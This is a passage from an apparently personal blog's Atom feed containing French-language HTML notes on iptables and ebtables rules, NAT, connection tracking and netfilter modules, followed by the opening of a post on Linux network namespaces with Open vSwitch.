  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-j MASQUERADE&lt;/code&gt; : changer @ source privée d’un paquet pour utiliser une @ publique pour aller sur internet&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;for--t-mangle-&quot;&gt;for &lt;code class=&quot;highlighter-rouge&quot;&gt;-t mangle&lt;/code&gt; :&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PREROUTING&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INPUT&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OUTPUT&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FORWARD&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;POSTROUTING&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;choose-table-action&quot;&gt;choose table action&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-A&lt;/code&gt; : ajouter&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-D&lt;/code&gt; : supprimer&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-R&lt;/code&gt; : remplacer&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-I index&lt;/code&gt; : insérer (indice)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-L&lt;/code&gt; : afficher&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-F&lt;/code&gt; : vider&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-N –new-chain&lt;/code&gt; : nouvelle chaine&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-X –delete-chain&lt;/code&gt; : supprimer chaine&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-P –policy&lt;/code&gt; : politique par défaut d’une chaine&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La &lt;code class=&quot;highlighter-rouge&quot;&gt;policy&lt;/code&gt; est appliquée au paquet si aucune règle ne s’applique sur lui.
&lt;code class=&quot;highlighter-rouge&quot;&gt;iptables -t filter -P FORWARD DROP&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# créer une chaine&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; my_chain

&lt;span class=&quot;c&quot;&gt;# l'utiliser&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; my_chain
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;sélectioner-des-paquets&quot;&gt;Sélectioner des paquets&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-p&lt;/code&gt; : protocole des données, tcp, udp, icmp,…&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-s&lt;/code&gt; : @IP src. du paquet&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-d&lt;/code&gt; : @IP dst. du paquet&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-i&lt;/code&gt; : interface d’entrée du paquet (eth0, enp0s3)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-o&lt;/code&gt; : interface de sortie&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-f&lt;/code&gt; : si le paquet est un fragment&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--sport&lt;/code&gt; : port source&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--dport&lt;/code&gt; : port destination&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-m multiport&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-m multiport --dports 10:100&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;–tcp-flags&lt;/code&gt; : flags tcp
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--tcp-flags SYN,RST,ACK,FIN,URG,PSH,ALL,NONE&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;–icmp-type 8&lt;/code&gt; : code icmp&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;–mac-source&lt;/code&gt; : @MAC source de la trame&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;–state&lt;/code&gt; : état de la connexion
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-m state --state NEW,ESTABLISHED,RELATED,INVALID&lt;/code&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;-m -match&lt;/code&gt; suivi du nom du module et des options de celui-ci prefixé par –&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;États d’une connexion&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ETABLISHED&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;connexion déjà établie&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;NEW&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;demande nouvelle connexion&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INVALID&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;associé à connexion inconnue&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RELATED&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;le paquet est en rapport avec une connexion déjà existante&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;commands-example&quot;&gt;commands example&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# bloquer tout le trafic TCP à destination de la machine&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; filter &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DROP

&lt;span class=&quot;c&quot;&gt;# bloquer tous le trafic à destination de notre machine envoyé sur le port 80 en tcp avec comme adress source 192.168.10.3.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; filter &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.10.3 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DROP

&lt;span class=&quot;c&quot;&gt;# rediriger tout le trafic arrivant sur le port 80 de notre machine avec comme adresse de destination 51.18.65.167 en tcp vers la machine local 10.10.10.10 sur le port 80.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 51.18.65.167 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DNAT -–to-destination 10.10.10.10:80

&lt;span class=&quot;c&quot;&gt;# proxy transparent, forcer utilisateurs à utiliser proxy, même si navigateur non configuré&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables –t nat –A PREROUTING –s 192.168.1.0/24 –p tcp –-dport 80 –j REDIRECT –-to-port 3128

&lt;span class=&quot;c&quot;&gt;# accepter tous les paquets du réseau 192.168.1.0/24 en entré, en sortie et en routage.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT

&lt;span class=&quot;c&quot;&gt;# DNAT en PREROUTING&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables –t nat –A PREROUTING –d 10.0.0.10 –p tcp –-dport 2222 –j DNAT –-to-destination 192.168.1.100:22

&lt;span class=&quot;c&quot;&gt;# SNAT en POSTROUTING&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables –t nat –A POSTROUTING –s 192.168.1.0/24 –j SNAT –-to-source 1.2.3.1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables –t nat –A POSTROUTING –s 192.168.1.0/24 –j MASQUERADE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;configuration-example&quot;&gt;configuration example&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# vide toutes les chaînes&lt;/span&gt;
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;--flush&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# autorise tout le trafic possible sur la loopback&lt;/span&gt;
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; lo &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; lo &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT

&lt;span class=&quot;c&quot;&gt;# policies par défaut : on bloque tout &lt;/span&gt;
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; INPUT DROP
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; OUTPUT DROP
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; FORWARD DROP

&lt;span class=&quot;c&quot;&gt;# autorise le trafic déjà établie&lt;/span&gt;
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT

&lt;span class=&quot;c&quot;&gt;# autorise tout trafic en sortie (outbound)&lt;/span&gt;
/sbin/iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; NEW,ESTABLISHED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;more&quot;&gt;more&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;conntrack est une partie de netfilter, pour gérer la durée de vie des connexions
la 3ème colonne indique 30, c’est à dire le temps avant de fermer la connexion&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# vérifier connexion&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;conntrack &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;conntrack &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# temp réel&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# aide sur un module&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; limit &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; devant une selection permet de faire linverse

&lt;span class=&quot;c&quot;&gt;# afficher toutes les règles&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; filter &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Pour surveiller, l’application des règles et voir si elles se déclenchent &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;watch ebtables &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--Lc&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;watch iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-nvL&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Pour sauvegarder/restaurer ce que l’on a définit dans iptables :&lt;/span&gt;
iptables-save
  &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; : permet de conserver les valeurs de compteurs à fin de statistiques &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; : permet de sélectionner la table à sauvegarder &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;si l’option est omise, toutes les tables sont sauve-
gardées&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
iptables-restore
  &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; : permet de restaurer les valeurs de compteur &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; : permet de ne pas effacer les règles existantes avant restauration.

&lt;span class=&quot;c&quot;&gt;# réinitialer compteurs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; FORWARD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;filter-on-mac-address&quot;&gt;filter on mac address&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nat sur @mac&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ebtables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 00:11:22:33:44:55 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; dnat &lt;span class=&quot;nt&quot;&gt;--to-destination&lt;/span&gt; 54:44:33:22:11:00
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ebtables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; POSTROUTING &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 00:11:22:33:44:55 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; snat &lt;span class=&quot;nt&quot;&gt;--to-source&lt;/span&gt; 54:44:33:22:11:00 &lt;span class=&quot;nt&quot;&gt;--snat-target&lt;/span&gt; ACCEPT

&lt;span class=&quot;c&quot;&gt;# répondre automatiquement à requêtes arp&lt;/span&gt;
ebtables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; arp &lt;span class=&quot;nt&quot;&gt;--arp-opcode&lt;/span&gt; Request &lt;span class=&quot;nt&quot;&gt;--arp-ip-dst&lt;/span&gt; 192.168.127.2 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; arpreply &lt;span class=&quot;nt&quot;&gt;--arpreply-mac&lt;/span&gt; de:ad:be:ef:ca:fe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;netfilter-modules&quot;&gt;netfilter modules&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;time&lt;/code&gt;: limiter durée connexion par jours&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;quota&lt;/code&gt;: ajouter un quota sur certains paquets&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nth&lt;/code&gt;: faire équilibrage de charge, round robin entre plusieurs serveurs&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;u32&lt;/code&gt;: modules pour tester valeur d’octets particuliers du datagramme IP&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;length&lt;/code&gt;: limiter paquets à une certaines taille&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;owner&lt;/code&gt;: tenir compte des paquets crées localement du processus de son propriétaire&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt;: contruire liste d’IP ou de MAC ou de numéro de port et les utiliser dans les règles&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;limit&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;conn&lt;/code&gt;: limiter nombre de connexions sur des services&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;limit&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;burst&lt;/code&gt;: système de jeton et d’autorisation&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;log&lt;/code&gt;: logger un trafique sur du &lt;code class=&quot;highlighter-rouge&quot;&gt;dmesg&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hashlimit&lt;/code&gt; : éviter bruteforce&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;mangle-table&quot;&gt;mangle table&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# champs TOS et DSCP&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; mangle &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DSCP &lt;span class=&quot;nt&quot;&gt;--set-dscp&lt;/span&gt; 1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; mangle &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DSCP &lt;span class=&quot;nt&quot;&gt;--set-dscp-class&lt;/span&gt; EF

&lt;span class=&quot;c&quot;&gt;# TTL&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; mangle &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; TTL &lt;span class=&quot;nt&quot;&gt;--ttl-inc&lt;/span&gt; 1
&lt;span class=&quot;c&quot;&gt;# --ttl-set 20&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# --ttl-dec 2&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# --ttl-inc 2&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;sources&quot;&gt;sources&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://lea-linux.org/documentations/Iptables&quot;&gt;Lea linux&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://p-fb.net/master-1/reseaux-i.html&quot;&gt;p-fb.net&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>netns</title>
   <link href="http://localhost:4000/linux/network/2018/12/24/netns/"/>
   <updated>2018-12-24T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/network/2018/12/24/netns</id>
   <content type="html">&lt;!--more--&gt;

&lt;p&gt;A network namespace is logically copy of the network stack, with its own routes, firewall rules, and network devices.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;commands&quot;&gt;commands&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# les interfaces&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add toto &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;dummy

&lt;span class=&quot;c&quot;&gt;# les liensn veth: virtual ethernet, 2 extrémités veth et veth peer&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add veth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name veth1

&lt;span class=&quot;c&quot;&gt;# les switches&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ovs-vsctl add-br mon_switch
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ovs-vsctl add-port mon_switch veth1

&lt;span class=&quot;c&quot;&gt;# le routeur&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;sysctl &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; net.ipv4.conf.all.forwarding&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;c&quot;&gt;# activer fonction de routage&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; net &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; POSTROUTING &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.0.0.0/24 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; MASQUERADE &lt;span class=&quot;c&quot;&gt;# firewall pour activer le NAT&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Création h1———switch—h2&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# passe en administrateur&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# créer les namespaces pour les hôtes&lt;/span&gt;
ip netns add h1
ip netns add h2

&lt;span class=&quot;c&quot;&gt;# créer le switch&lt;/span&gt;
ovs-vsctl add-br s1 &lt;span class=&quot;c&quot;&gt;#1&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# créer les liens&lt;/span&gt;
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add h1-eth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name s1-h1 
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add h2-eth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name s1-h2
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;show &lt;span class=&quot;c&quot;&gt;#3&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# accrocher les liens aux namespaces&lt;/span&gt;
